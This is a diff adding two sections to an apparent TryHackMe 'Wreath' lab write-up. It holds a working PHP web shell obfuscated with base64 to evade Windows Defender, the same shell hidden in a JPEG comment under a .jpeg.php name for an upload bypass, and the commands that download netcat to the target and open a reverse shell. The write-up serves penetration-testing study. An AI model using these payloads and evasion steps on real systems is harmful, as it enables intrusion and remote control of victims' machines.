@@ -2844,3 +2844,144 @@ Evading by password protecting
 AV vendors are also in close contact with each other. Once detected, file is sent and analysed by another vendor and shielded against. The knowledge is rapidly shared
 
 </details>
+
+## 26. AV Evasion - PHP payload obfuscation
+
+<details>
+  <summary>---</summary>
+
+Given that we know the AV used on the PC is Windows Defender (preinstalled with Windows Server):
+  - We build payload in a slightly less common way
+  - We obfuscate manually or using a tool online
+
+Payload:
+```php
+<?php
+    $cmd = $_GET["wreath"];
+    if(isset($cmd)){
+        echo "<pre>" . shell_exec($cmd) . "</pre>";
+    }
+    die();
+?>
+```
+
+This payload:
+- Checks if `GET` parameter called `wreath` has been set
+- If set, `shell_exec()` executes (lives in `<pre>` tag for clean output)
+- Use `die()` to prevent rest of garble text from image showing up
+
+This is slighly longer than the standard `<?php system($_GET["cmd"]);?>` because
+- Obfuscating will become one liner anyway
+- Being different is good for AV evasion
+
+With the payload, we now obfuscate it by:
+- Switch parts of exploit around so they are in unusual order
+- Encoding all the strings
+- Splitting up distinctive parts of the code (eg. `shell_exec($_GET[...])`)
+
+Here we use online [php obfuscator](https://www.gaijin.at/en/tools/php-obfuscator) with all obfuscation options set and we get:
+```php
+<?php $v0=$_GET[base64_decode('d3JlYXRo')];if(isset($v0)){echo base64_decode('PHByZT4=').shell_exec($v0).base64_decode('PC9wcmU+');}die();?>
+```
+
+The payload will need some escaping because `$` will be interpreted as bash variables
+
+`<?php \$v0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$v0)){echo base64_decode('PHByZT4=').shell_exec(\$v0).base64_decode('PC9wcmU+');}die();?>`
+
+Make a new copy of the image and inject our new payload
+```
+kali@kali:~/thm/wreath$ cp ~/Downloads/corg.jpg ./shell-Neozer0.jpeg.php
+kali@kali:~/thm/wreath$ exiftool -Comment="<?php \$v0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$v0)){echo base64_decode('PHByZT4=').shell_exec(\$v0).base64_decode('PC9wcmU+');}die();?>" shell-Neozer0.jpeg.php 
+    1 image files updated
+kali@kali:~/thm/wreath$ exiftool shell-Neozer0.jpeg.php
+ExifTool Version Number         : 12.16
+File Name                       : shell-Neozer0.jpeg.php
+Directory                       : .
+File Size                       : 46 KiB
+File Modification Date/Time     : 2021:04:24 08:24:07-04:00
+File Access Date/Time           : 2021:04:24 08:24:07-04:00
+File Inode Change Date/Time     : 2021:04:24 08:24:07-04:00
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Comment                         : <?php $v0=$_GET[base64_decode('d3JlYXRo')];if(isset($v0)){echo base64_decode('PHByZT4=').shell_exec($v0).base64_decode('PC9wcmU+');}die();?>
+Image Width                     : 750
+Image Height                    : 750
+Encoding Process                : Progressive DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 750x750
+Megapixels                      : 0.562
+```
+
+Visiting the page we get
+
+![upload success](phpshell.png)
+
+Where we can execute command with param `wreath`
+
+![run systeminfo](phpshellsysinfo.png)
+
+</details>
+
+
+## 27. AV Evasion - compile netcat and get reverse shell
+
+<details>
+  <summary>---</summary>
+
+- Webshell is ok but let's upgrade to full reverse shell
+- There are less options for Windows to obtain reverse shell compared to Linux
+- Options are:
+  - Powershell - but Defender can detect this very well
+  - PHP reverse shell as there is a PHP interpreter installed - this tends to trigger Defender also
+  - Generate executable reverse shell using msfvenom, upload then activate it using webshell. msfvenom shells tend to be distintive. Could try `Veil Framework` to get meterpreter shell executable that might bypass Defender
+  - Easiest and quickest way is to upload netcat (netcat for Windows inside Kali is known to defender so we need a variant)
+
+Download netcat variant https://github.com/int0x33/nc.exe/
+
+We upload the `nc.exe` to the target
+
+1. Start http server and 
+```
+kali@kali:~/code/nc.exe$ sudo python3 -m http.server 80
+[sudo] password for kali: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.200.85.100 - - [24/Apr/2021 08:50:59] "GET /nc.exe HTTP/1.1" 200 -
+
+```
+
+2. Run curl command on webshell `curl http://10.50.86.79/nc64.exe -o c:\\windows\\temp\\nc-Neozer0.exe`
+
+![curl nc](curlnc.png)
+
+3. Set up netcat listener
+```
+kali@kali:~/thm/wreath$ sudo nc -lvnp 49999
+listening on [any] 49999 ...
+
+```
+
+4. Run command to start reverse shell - `10.200.85.100/resources/uploads/shell-Neozer0.jpeg.php?wreath=powershell.exe%20c:\\windows\\temp\\nc-Neozer0.exe%2010.50.86.79%2049999%20-e%20cmd.exe`
+
+![nc reverse shell](ncreverseshell.png)
+
+5. Back on netcat listener we get a shell
+```
+kali@kali:~/thm/wreath$ sudo nc -lvnp 49999
+listening on [any] 49999 ...
+connect to [10.50.86.79] from (UNKNOWN) [10.200.85.100] 50050
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\resources\uploads>
+
+```
+
+</details>
